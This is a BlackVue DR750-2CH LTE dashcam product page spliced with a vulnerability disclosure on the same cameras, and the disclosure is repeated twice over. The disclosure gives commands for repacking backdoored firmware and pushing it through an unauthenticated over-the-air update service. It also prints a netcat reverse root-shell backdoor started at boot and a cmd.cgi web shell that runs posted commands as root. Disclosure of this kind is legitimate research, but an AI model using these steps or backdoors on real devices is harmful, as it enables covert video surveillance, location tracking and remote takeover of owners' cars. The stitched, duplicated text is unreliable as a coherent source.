![DR750-2CH-LTE-parking-motion-impact-detection](data:image/svg+xml...)

### BUILT-IN SPEAKER, IMPACT SENSOR AND MOTION DETECTION

**Speaker:** your dashcam tells you when it turns on, shuts down or detects errors.
**Accelerometer:** detects impacts to trigger Event recording. Enables Parking Mode\* when stationary for 5 minutes.
**Motion detection:** while in Parking Mode, your dashcam can record videos as movement is detected by either the front or interior camera.
**Video filters (N,E,P,M):** display the types of videos you need in the BlackVue App and Viewer. The filters are **N**ormal, **E**vent (Impact), **P**arking motion, **M**anual Event.

*(\*) Parking Mode Kit or Battery is required.*[*Learn more about Parking Mode.*](https://blackvue.com/blackvue-dashcam-parking-mode/)

### BLACKVUE APP (IOS, ANDROID) AND VIEWER (WINDOWS/MAC)

#### EASILY MANAGE YOUR VIDEOS AND ACCESS CLOUD FEATURES

Both the BlackVue App and Viewer are **free to download and use**.

Easily change your **BlackVue configuration** settings and **browse through your videos** intuitively, either from the **SD card or over the Cloud**.

With the BlackVue App, access your BlackVue’s videos over Wi-Fi or the Cloud and check real-time Live View for perfect positioning of your dashcam.

![DR750-2CH-LTE-format-button](data:image/svg+xml...)

### SLEEK DESIGN AND CONTROLS

#### MULTIFUNCTION BUTTON AND CUSTOMIZABLE PROXIMITY SENSOR

BlackVue’s stealthy design incorporates easy access to useful functions.
**Proximity sensor:**toggle audio recording ON and OFF by simply waving your hand in front of it. The sensor can also be configured to trigger Manual Event videos in the settings.
**Wi-Fi button:**turn Wi-Fi ON/OFF (short press), reset your Wi-Fi password (hold until voice prompt, then short press) or format the microSD card (hold until voice prompt, and then hold again). All actions are confirmed by a voice prompt.

### OPTIMIZED FILE MANAGEMENT

**Event Files Overwrite Protection:**dashcams record in a loop but BlackVue DR750-2CH LTE can prevent the overwriting of up to fifty (50) Event files (triggered manually or by impacts). You can choose to allow new Event files to overwrite past Event files, thus keeping the latest fifty.
**Adaptive Format-Free File Management:**developed by BlackVue, this file system improves recording stability and reduces the need for microSD card formatting, while giving you the flexibility to change recording time unit (1/2/3 minutes) and quality settings.
**SD Card Failure Alert:**your BlackVue detects as soon as the microSD card fails and warns you with a “Please check SD card” voice alert.
**Scheduled Reboots:**see Parking Mode section below.

![](https://shop.blackvue.com/wp-content/uploads/2020/05/BTC-3A-Tamper-Proof-Case.png)
![](data:image/svg+xml...)

### TAMPER-PROOF CASE (OPTIONAL)

The Tamper-Proof Case is a security accessory that blocks physical access to the microSD card slot, and prevents unplugging the power and coaxial cables, thus highly reducing risks of data tampering.
**Note:** unlike tamper-proof cases for other models, the BTC-3A designed for DR750-2CH LTE / DR750-2CH IR LTE replaces the dashcam’s mount.

## INTELLIGENT PARKING MODE MONITORING

with the [**Power Magic accessories**](https://blackvue.com/parking-mode-accessories-overview/).

Enjoy peace of mind knowing that your car is under protection while you are away.

### Parking Mode Kit

![blackvue-power-magic-pro-parking-mode-kit](https://shop.blackvue.com/wp-content/uploads/2020/02/blackvue-power-magic-pro-parking-mode-kit.png)
![blackvue-power-magic-pro-parking-mode-kit](data:image/svg+xml...)

### Parking Mode Batteries

![blackvue-parking-mode-batteries](https://shop.blackvue.com/wp-content/uploads/2020/01/blackvue-parking-mode-batteries-white.png)
![blackvue-parking-mode-batteries](data:image/svg+xml...)

BlackVue automatically switches to Parking Mode to monitor your parked vehicle.
Thanks to **video buffer**, the few seconds leading to triggering events are also recorded.
DR750-2CH IR LTE supports two Parking Mode options:

![](https://shop.blackvue.com/wp-content/uploads/2020/04/Region-based.png)
![](data:image/svg+xml...)

Motion & Impact Detection Parking Mode detects both:

* **Motions** recorded by the image sensor (marked “P” in the file list).
* **Impacts** detected by the accelerometer/G-sensor (marked “E” in the file list).

Choose detection regions to reduce the risk of triggering unwanted motion recordings due to trees swaying in the wind, far-away moving objects, etc.

![](https://shop.blackvue.com/wp-content/uploads/2020/04/Time-lapse.png)
![](data:image/svg+xml...)

**Continuously records at 1FPS** (one frame per second). Videos are played back at 30FPS.
1-minute Time lapse Parking Mode video = 30 minutes real time coverage.
Cover a period of more than **54 hours on a 32GB microSD** card front and rear at the highest (Extreme) quality setting.
When an impact is detected, the dashcam creates a buffered **Event video**.

### And also:

**Parking Mode Event Voice Notifications:**Upon exiting Parking Mode, your BlackVue tells you if Events were recorded when you were away from your car, so you can check right away the Event videos on the BlackVue App.

**Scheduled Reboot:**Schedule a daily automatic reboot (optional—at night by default) to minimize potential errors. Reboots happen only if the dashcam is in Parking Mode and not writing data to the microSD card.

**Super stealthy:**Completely turn off all LED indicators in Parking Mode. Only the recording LED indicator facing the interior of the vehicle will blink when motion or impact is detected.

# BlackVue DR750 CVEs (+ more)

The below is for educational purposes only, do not try this on any device you do not own or have permission to use.

As of writing, there are about ~300 vulnerable BlackVue devices online, which can easily be discovered and exploited, and no official patch is out.

BlackVue was informed about these vulnerbilites 30-07-2022, and responded they would look into the issues.
However, nothing has happened as far as we are aware.

## Backdooring the device (*CVE-2023-27748*)

### No Firmware Authentication Check

There is no authenticity check for the firmware, which allows a malicious attacker to upload a custom firmware.
This custom firmare can include backdoors or exploits.

Steps to reproduce:

1. Download a firmware archive from BlackVue's website
2. Unpack the `.zip` containing the firmware files
3. Unpack the image `patch_<dashcam_name>.bin`
4. Change/add the files wanted (check [Example Backdoors](#example-backdoors))
5. `tar.gz` the image again
6. Calculate the sue checksum for the new `patch_<dashcam_name>.bin` (check [sue\_checksum](/eyJhb/blackvue-cve-2023/blob/master/software/sue_checksum))

```
# downloaded from https://blackvue.com/download/dr750-2ch-lte-firmware-multilanguage/
$ unzip dr750-2ch-lte-v1.012-eng.zip
$ cd BlackVue/System/upgrade
$ mkdir patch-out
$ tar -C patch-out -xvzf patch_DR750LTE.bin
# make changes in patch-out
$ tar -C patch-out -czvf patch_DR750LTE.bin .
$ python3 sue_checksum.py patch_DR750LTE.bin patch_DR750LTE.bin.sue
$ cd ../../../
```

Then just place the folder `BlackVue` on the SD card of the dashcam, and it will start running it.

When creating a firmware for FOTA (Firmware Over The Air), then create a `.tgz` file of the `System` directory instead.

```
$ tar -C BlackVue/System -czvf fwupgrade.tgz
```

This file can then be used later to upload a custom firmware using FOTA and compromise a dashcam fully.

It is important to note that during testing, it was noted that even when flashing the official firmware from BlackVue's website back to the device, the backdoors placed persisted.

### Unauthenticated FOTA (Firmware Over The Air) protocol

The BlackVue dashcams will listen on port `9771/TCP`, where the FOTA (firmware over the air) service is running.
This service allows to ping, restart, get device time, upgrade firmware, etc.

There is nothing protecting this endpoint and it can be accessed when connected to the same LAN as the dashcam or from the internet if the dashcam is connected to LTE, which is a significant security risk.
A python script which can communicate with the FOTA service can be found [here](/eyJhb/blackvue-cve-2023/blob/master/software/fota/fota.py).

Create a new firmware based on the steps from the previous section, and upload it using the Python script.

```
python software/fota/fota.py 10.0.0.1 upgrade /tmp/fwupgrade.tgz
```

This utility comes with no guarantee that it works, but it has worked once before.

### No firewall

The dashcams do not come with any firewall enabled, which is less of an issue if the dashcam is only connected via Wi-Fi.
However, the LTE version is connected directly to the internet, as some mobile providers don't have a firewall set up and don't put their users behind NAT.
This can be verified by looking at the extracted firmware.

At the very least the BlackVue dashcams with LTE should block connections on the LTE side.

## Insecure default Wi-Fi password (*CVE-2023-27746*)

The default Wi-Fi password for the dashcam is only lowercase alphanumeric characters, with a length of 8.
It is possible to intercept a handshake from the dashcam, and use tools from Aircrack-ng to calculate the password (if the user has not changed it).
This can be done in approx ~4 days using rented hardware (~40 EUR).

## Unauthenticated webserver (*CVE-2023-27747*)

By default the webserver can be accessed without authentication and exposes various endpoints.

```
├── blackvue_live.cgi
├── blackvue_livedata.cgi
├── blackvue_vod.cgi
├── Config
├── index.html
├── Record
└── upload.cgi

```

These endpoints allow the following:

1. Live feed of the dashcam
2. Live data feed (position, speed, etc.)
3. Download all recordings from the dashcam
4. Upload a custom config to the dashcam
5. Download the current config from the dashcam
   5.1. This includes potential Wi-Fi information that can be decrypted (see above)

## Insecure storage of Wi-Fi password on SD-card

The Wi-Fi SSID and password of the network the dashcam will connect to are stored on the SD-card in the dashcam.
This data is encrypted, but the key is easily revealed by reverse engineering the app.
As demonstrated by [wifi-decrypt.py](/eyJhb/blackvue-cve-2023/blob/master/software/wifi-decrypt/wifi-decrypt.py).

It is also worth noting that when changing the Wi-Fi network the dashcam should connect to, these values are sent to BlackVue's servers, which will store it until they can send the information to the dashcam.
Whether this data is deleted upon the dashcam becoming available is unknown.

## Combining these attacks

All these can be combined into simple RCE, especially with the LTE dashcams.

1. Craft a custom firmware with a backdoor
2. Use fota.py to upload the firmware remotely
3. Connect to backdoor
4. ???
5. Profit

## Example backdoors

Some examples of backdoors, which could be included in custom firmware.

### Netcat

The following backdoor, will connect to a remote machine and give full shell access as root.

`/bin/backdoor.sh`

```
#!/bin/sh
IP=$1
PORT=$2

while /bin/true; do
    /usr/bin/nc $IP $PORT -e /bin/sh
done
```

The following init.d script will start the backdoor at every boot, and connect to the given IP/port.
`/etc/init.d/S85backdoor`

```
#!/bin/sh
/bin/backdoor 10.99.77.20 1745 &
```

### `cmd.cgi`

The following backdoor will allow executing commands (as root), when a payload is sent to the webserver.

`/res/System/www/cmd.cgi`

```
#!/bin/sh

echo "Content-type: text/html"    # set the data-type we want to use
echo ""

POST_STRING=$(/bin/cat)
echo $POST_STRING
exec $POST_STRING
```

# BlackVue DR750 CVEs (+ more)

The below is for educational purposes only, do not try this on any device you do not own or have permission to use.

As of writing, there are about ~300 vulnerable BlackVue devices online, which can easily be discovered and exploited, and no official patch is out.

BlackVue was informed about these vulnerbilites 30-07-2022, and responded they would look into the issues.
However, nothing has happened as far as we are aware.

## Backdooring the device (*CVE-2023-27748*)

### No Firmware Authentication Check

There is no authenticity check for the firmware, which allows a malicious attacker to upload a custom firmware.
This custom firmare can include backdoors or exploits.

Steps to reproduce:

1. Download a firmware archive from BlackVue's website
2. Unpack the `.zip` containing the firmware files
3. Unpack the image `patch_<dashcam_name>.bin`
4. Change/add the files wanted (check [Example Backdoors](#example-backdoors))
5. `tar.gz` the image again
6. Calculate the sue checksum for the new `patch_<dashcam_name>.bin` (check [sue\_checksum](/eyJhb/blackvue-cve-2023/blob/master/software/sue_checksum))

```
# downloaded from https://blackvue.com/download/dr750-2ch-lte-firmware-multilanguage/
$ unzip dr750-2ch-lte-v1.012-eng.zip
$ cd BlackVue/System/upgrade
$ mkdir patch-out
$ tar -C patch-out -xvzf patch_DR750LTE.bin
# make changes in patch-out
$ tar -C patch-out -czvf patch_DR750LTE.bin .
$ python3 sue_checksum.py patch_DR750LTE.bin patch_DR750LTE.bin.sue
$ cd ../../../
```

Then just place the folder `BlackVue` on the SD card of the dashcam, and it will start running it.

When creating a firmware for FOTA (Firmware Over The Air), then create a `.tgz` file of the `System` directory instead.

```
$ tar -C BlackVue/System -czvf fwupgrade.tgz
```

This file can then be used later to upload a custom firmware using FOTA and compromise a dashcam fully.

It is important to note that during testing, it was noted that even when flashing the official firmware from BlackVue's website back to the device, the backdoors placed persisted.

### Unauthenticated FOTA (Firmware Over The Air) protocol

The BlackVue dashcams will listen on port `9771/TCP`, where the FOTA (firmware over the air) service is running.
This service allows to ping, restart, get device time, upgrade firmware, etc.

There is nothing protecting this endpoint and it can be accessed when connected to the same LAN as the dashcam or from the internet if the dashcam is connected to LTE, which is a significant security risk.
A python script which can communicate with the FOTA service can be found [here](/eyJhb/blackvue-cve-2023/blob/master/software/fota/fota.py).

Create a new firmware based on the steps from the previous section, and upload it using the Python script.

```
python software/fota/fota.py 10.0.0.1 upgrade /tmp/fwupgrade.tgz
```

This utility comes with no guarantee that it works, but it has worked once before.

### No firewall

The dashcams do not come with any firewall enabled, which is less of an issue if the dashcam is only connected via Wi-Fi.
However, the LTE version is connected directly to the internet, as some mobile providers don't have a firewall set up and don't put their users behind NAT.
This can be verified by looking at the extracted firmware.

At the very least the BlackVue dashcams with LTE should block connections on the LTE side.

## Insecure default Wi-Fi password (*CVE-2023-27746*)

The default Wi-Fi password for the dashcam is only lowercase alphanumeric characters, with a length of 8.
It is possible to intercept a handshake from the dashcam, and use tools from Aircrack-ng to calculate the password (if the user has not changed it).
This can be done in approx ~4 days using rented hardware (~40 EUR).

## Unauthenticated webserver (*CVE-2023-27747*)

By default the webserver can be accessed without authentication and exposes various endpoints.

```
├── blackvue_live.cgi
├── blackvue_livedata.cgi
├── blackvue_vod.cgi
├── Config
├── index.html
├── Record
└── upload.cgi

```

These endpoints allow the following:

1. Live feed of the dashcam
2. Live data feed (position, speed, etc.)
3. Download all recordings from the dashcam
4. Upload a custom config to the dashcam
5. Download the current config from the dashcam
   5.1. This includes potential Wi-Fi information that can be decrypted (see above)

## Insecure storage of Wi-Fi password on SD-card

The Wi-Fi SSID and password of the network the dashcam will connect to are stored on the SD-card in the dashcam.
This data is encrypted, but the key is easily revealed by reverse engineering the app.
As demonstrated by [wifi-decrypt.py](/eyJhb/blackvue-cve-2023/blob/master/software/wifi-decrypt/wifi-decrypt.py).

It is also worth noting that when changing the Wi-Fi network the dashcam should connect to, these values are sent to BlackVue's servers, which will store it until they can send the information to the dashcam.
Whether this data is deleted upon the dashcam becoming available is unknown.

## Combining these attacks

All these can be combined into simple RCE, especially with the LTE dashcams.

1. Craft a custom firmware with a backdoor
2. Use fota.py to upload the firmware remotely
3. Connect to backdoor
4. ???
5. Profit

## Example backdoors

Some examples of backdoors, which could be included in custom firmware.

### Netcat

The following backdoor, will connect to a remote machine and give full shell access as root.

`/bin/backdoor.sh`

```
#!/bin/sh
IP=$1
PORT=$2

while /bin/true; do
    /usr/bin/nc $IP $PORT -e /bin/sh
done
```

The following init.d script will start the backdoor at every boot, and connect to the given IP/port.
`/etc/init.d/S85backdoor`

```
#!/bin/sh
/bin/backdoor 10.99.77.20 1745 &
```

### `cmd.cgi`

The following backdoor will allow executing commands (as root), when a payload is sent to the webserver.

`/res/System/www/cmd.cgi`

```
#!/bin/sh

echo "Content-type: text/html"    # set the data-type we want to use
echo ""

POST_STRING=$(/bin/cat)
echo $POST_STRING
exec $POST_STRING
```
